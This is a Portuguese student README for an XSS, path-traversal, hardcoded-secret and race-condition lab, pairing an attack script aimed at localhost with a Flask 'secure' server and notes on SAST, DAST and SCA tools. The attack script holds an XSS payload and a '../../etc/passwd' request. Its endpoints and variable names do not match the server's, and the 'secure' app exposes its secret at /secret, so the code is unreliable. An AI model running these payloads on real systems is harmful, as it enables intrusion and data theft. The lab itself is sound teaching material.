# 👾 CyberSecurity - Ataque x Defesa

## 👥 Integrantes

- **Eduardo Fedeli Souza** — RM550132  
- **Gabriel Torres Luiz** — RM98600  
- **Otávio Vitoriano Da Silva** — RM552012  

## Laboratório de Vulnerabilidades e Correções em Python

Este projeto demonstra, de forma didática, quatro **vulnerabilidades** comuns em aplicações e como elas podem ser exploradas e corrigidas. O objetivo é mostrar, na prática, como falhas simples podem comprometer um sistema e como usar **boas práticas e ferramentas de CI/CD** para evitá-las.

## 📌 Vulnerabilidades Abordadas

### 1. Cross-Site Scripting (XSS)
🔎 Conceito

XSS ocorre quando uma aplicação retorna dados sem sanitização, permitindo que um atacante injete código JavaScript malicioso no navegador da vítima.

⚠ Risco

- Roubo de cookies/session
- Desfiguração de página
- Redirecionamento para sites falsos
- Execução de ações em nome da vítima

### 2. Path Traversal
🔎 Conceito

Path Traversal acontece quando entradas do usuário são usadas para acessar arquivos no sistema operacional sem validação adequada.

⚠ Risco

- Vazamento de arquivos sensíveis (ex: /etc/passwd)
- Execução de código malicioso
- Exposição de credenciais internas

### 3. Hardcoded Secrets
🔎 Conceito

A falha ocorre quando senhas, tokens ou chaves são deixados expostos no código-fonte.

⚠ Risco

- Acesso indevido a APIs
- Vazamento de dados sigilosos
- Comprometimento total da infraestrutura

### 4. Race Condition 
🔎 Conceito

Ocorre quando dois processos acessam um recurso compartilhado ao mesmo tempo.

⚠ Risco

- Escrita/alteração de dados indevida
- Elevação de privilégios
- Corrupção de arquivos ou registros

## 🧪 💥 Arquivo de Ataque — ataque.py

Este script demonstra a exploração das vulnerabilidades simuladas no servidor.

``` py
"""
ataque.py
Demonstração acadêmica de exploração de vulnerabilidades
NÃO EXECUTAR EM PRODUÇÃO
"""

import requests
import pickle

# ==========================================================
# 1) CROSS-SITE SCRIPTING (XSS)
# ==========================================================

def ataque_xss():
    payload = "<script>alert('XSS');</script>"
    print("[XSS] Enviando payload malicioso...")
    resp = requests.post("http://localhost:5000/comentario", data={"texto": payload})
    print("Resposta:", resp.text)


# ==========================================================
# 2) PATH TRAVERSAL
# ==========================================================

def ataque_path_traversal():
    payload = "../../etc/passwd"
    print("[Traversal] Tentando ler arquivo sensível...")
    resp = requests.get(f"http://localhost:5000/abrir?arquivo={payload}")
    print("Conteúdo retornado:", resp.text[:200], "...")  # print parcial


# ==========================================================
# 3) HARDCODED SECRETS (simulação de vazamento)
# ==========================================================

def ataque_segredo_exposto():
    print("[Secrets] Simulando leitura de segredo exposto em código...")
    import defesa  # defensor inseguro com segredo hardcoded
    print("Segredo obtido:", defesa.API_KEY)


# ==========================================================
# 4) RACE CONDITION
# ==========================================================

import threading

def escrever():
    requests.get("http://localhost:5000/escrever")

def ataque_race_condition():
    print("[Race] Disparando múltiplas requisições simultâneas...")
    threads = []
    for _ in range(20):
        t = threading.Thread(target=escrever)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print("Ataque de race finalizado.")


# ==========================================================
# EXECUÇÃO
# ==========================================================

if __name__ == "__main__":
    ataque_xss()
    ataque_path_traversal()
    ataque_segredo_exposto()
    ataque_race_condition()
```

## 🛡️ Arquivo de Defesa — defesa.py

Nesta versão, cada endpoint aplica práticas recomendadas de segurança.

``` py
from flask import Flask, request, jsonify
import html
import os
import threading

app = Flask(__name__)
lock = threading.Lock()

SECRET = os.getenv("APP_SECRET", "NO_KEY_FOUND")
BASE_DIR = "safe_files"

@app.post("/comment")
def comment():
    text = request.json.get("text", "")
    safe_text = html.escape(text)
    return f"Comentário recebido com segurança: {safe_text}", 200

@app.get("/file")
def file():
    name = request.args.get("name", "")
    if ".." in name or "/" in name:
        return "Arquivo inválido.", 400

    path = os.path.join(BASE_DIR, name)

    if not os.path.isfile(path):
        return "Arquivo não encontrado.", 404

    with open(path, "r") as f:
        content = f.read()

    return content, 200

@app.get("/secret")
def secret():
    return jsonify({"secret": SECRET})

counter = 0

@app.post("/update")
def update():
    global counter
    with lock:
        counter += 1
    return jsonify({"counter": counter})

if __name__ == "__main__":
    app.run(debug=True)
```

## 🛠️ Como configurar e rodar

### 1️⃣ Instale dependências
``` bash
pip install flask requests
```

### 2️⃣ Rode o servidor seguro
``` bash
python defesa.py
```

### 3️⃣ Em outro terminal, execute o ataque
``` bash
python ataque.py
```

## 🔍 Como essas vulnerabilidades são detectadas no CI/CD

### 🧪 1. SAST — Static Application Security Testing
Ferramentas analisam o código-fonte antes de rodar:

| Ferramenta               | Detecta                                       |
| ------------------------ | --------------------------------------------- |
| SonarQube                | XSS, Path Traversal, Secrets, Race Conditions |
| Bandit (Python)          | Uso inseguro de entrada, arquivos e threads   |
| Semgrep                  | Falhas de validação, funções perigosas        |
| GitHub Advanced Security | Segredos expostos                             |

- ✔ Identifica variáveis com senhas
- ✔ Identifica open() inseguro
- ✔ Detecta uso sem sanitização (html.escape)

### 🌐 2. DAST — Dynamic Application Security Testing
Ferramentas simulam ataques enquanto o app está rodando:

| Ferramenta | Detecta                              |
| ---------- | ------------------------------------ |
| OWASP ZAP  | XSS, Path Traversal, Race Conditions |
| Burp Suite | XSS e manipulação de parâmetros      |

- ✔ Testa injeção
- ✔ Testa caminhos de arquivos malformados
- ✔ Testa inputs maliciosos automaticamente

### 📦 3. SCA — Software Composition Analysis
Analisa bibliotecas e dependências:

| Ferramenta | Detecta                            |
| ---------- | ---------------------------------- |
| Dependabot | Vulnerabilidades em pacotes Python |
| Snyk       | CVEs em dependências               |
| Trivy      | Falhas em libs do projeto          |

- ✔ Garante que Flask e Requests estejam atualizados
- ✔ Evita uso de versões vulneráveis

## 📚 Conclusão
Este projeto demonstra:

- ✅ Como ataques reais podem ser feitos de forma simples
- ✅ Como corrigir cada falha com boas práticas
- ✅ Como CI/CD moderno detecta e previne vulnerabilidades
- ✅ Como separar ataque ➜ defesa 
